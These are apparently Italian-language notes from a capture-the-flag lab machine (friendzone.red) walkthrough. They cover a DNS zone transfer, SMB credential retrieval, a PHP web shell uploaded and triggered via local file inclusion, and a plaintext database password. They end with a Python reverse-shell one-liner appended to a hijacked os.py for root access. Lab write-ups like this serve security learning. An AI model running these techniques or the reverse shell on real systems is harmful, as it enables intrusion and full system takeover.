Cosa fare:

1) con nmap mi accorgo che c'è un server dns quindi, avendo ottenuto il dominio perfetto (sese) che sarebbe friendzone.red
2)faccio: dig +multi AXFR friendzone.red @10.10.10.123

; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> +multi AXFR friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red. 604800 IN SOA localhost. root.localhost. (
    2 ; serial
    604800 ; refresh (1 week)
    86400 ; retry (1 day)
    2419200 ; expire (4 weeks)
    604800 ; minimum (1 week)
    )
friendzone.red. 604800 IN AAAA ::1
friendzone.red. 604800 IN NS localhost.
friendzone.red. 604800 IN A 127.0.0.1
administrator1.friendzone.red. 604800 IN A 127.0.0.1
hr.friendzone.red. 604800 IN A 127.0.0.1
uploads.friendzone.red. 604800 IN A 127.0.0.1
friendzone.red. 604800 IN SOA localhost. root.localhost. (
    2 ; serial
    604800 ; refresh (1 week)
    86400 ; retry (1 day)
    2419200 ; expire (4 weeks)
    604800 ; minimum (1 week)
    )
;; Query time: 43 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Jul 04 15:49:27 CEST 2019
;; XFR size: 8 records (messages 1, bytes 289)

3) analizzando la macchina noto un samba, quindi accedo con smclient //10.10.10.123/general (write and read) -u root
4) get di credential.txt
5) quindi vado su https://administrator1.friendzone.red/dashboard.php
6) e mi uppo la shell php su smbclient //10.10.10.123/Development
Unable to initialize messaging context
Enter WORKGROUP\davide's password:
Try "help" to get a list of possible commands.
smb: \> ls
  . D 0 Thu Jul 4 11:09:07 2019
  .. D 0 Wed Jan 23 22:51:02 2019

  9221460 blocks of size 1024. 6458124 blocks available
smb: \> put /home/davide/hack/tools
tools tools1/
smb: \> put /home/davide/hack/tools1/
altdns/ dirtycow/ les.sh           phpshell.php static-binaries/
cosafare dnscan/ LinEnum/ sqlinjection
smb: \> put /home/davide/hack/tools1/phpshell.php
NT_STATUS_OBJECT_PATH_NOT_FOUND opening remote file \home\davide\hack\tools1\phpshell.php
smb: \> òs
òs: command not found
smb: \> ls
  . D 0 Thu Jul 4 11:09:07 2019
  .. D 0 Wed Jan 23 22:51:02 2019

  9221460 blocks of size 1024. 6458120 blocks available
smb: \> put /home/davide/h
hack/ hs_err_pid6825.log
smb: \> put /home/davide/hack/tools1/
altdns/ dirtycow/ les.sh           phpshell.php static-binaries/
cosafare dnscan/ LinEnum/ sqlinjection
smb: \> put /home/davide/hack/tools1/phpshell.php phpshell.php
putting file /home/davide/hack/tools1/phpshell.php as \phpshell.php

7) accedo a https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/phpshell

Root:
1) su /var/www/mysql... troviamo delle credenziali dell'utente friend, quindi:
2) db_user=friend

db_pass=Agpyu12!0.213$

3) andiamo su ssh friend e
4) siamo friend, eseguendo psypy mi accorgo che c'è un processo eseguito da root report.py
5) mi vado a stampare report.py, non posso modificarlo, ma importa os.py, vado a modificare quello
6) metto alla fine del file os.py : import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",7080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
7) e sono root.